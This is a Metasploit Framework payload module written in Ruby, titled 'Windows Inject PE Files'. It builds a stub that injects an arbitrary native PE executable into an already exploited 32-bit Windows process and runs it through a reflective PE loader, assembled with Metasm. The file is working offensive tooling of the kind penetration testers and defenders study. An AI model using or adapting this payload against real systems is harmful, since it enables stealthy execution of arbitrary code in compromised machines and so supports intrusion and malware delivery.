##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
#
###
#
# Injects an arbitrary PE file in the exploited process via reflective PE loader.
#
###
module MetasploitModule
  include Msf::Payload::Windows
  include Msf::Payload::Windows::PEInject
  include Msf::Payload::Windows::ReflectivePELoader

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Inject PE Files',
        'Description' => %q{
          Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE
          loader will execute the pre-mapped PE image starting from the address of entry after performing image base
          relocation and API address resolution. This module requires a PE file that contains relocation data and a
          valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks
          are not currently supported. Also PE files which use resource loading might crash.
        },
        'Author' => [
          'ege <egebalci[at]pm.me>'
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'References' => [
          'https://github.com/EgeBalci/Amber'
        ],
        'PayloadCompat' => {
          'Convention' => 'sockedi handleedi -http -https'
        },
        'DefaultOptions' => {
          'EXITFUNC' => 'thread'
        }
      )
    )
  end

  def encapsulate_reflective_stub(mapped_pe, opts)
    call_size = mapped_pe.length + 5
    reflective_loader = Metasm::Shellcode.assemble(Metasm::X86.new, "call $+#{call_size}").encode_string
    reflective_loader += mapped_pe
    reflective_loader + Metasm::Shellcode.assemble(Metasm::X86.new, asm_reflective_pe_loader(opts)).encode_string
  end
end
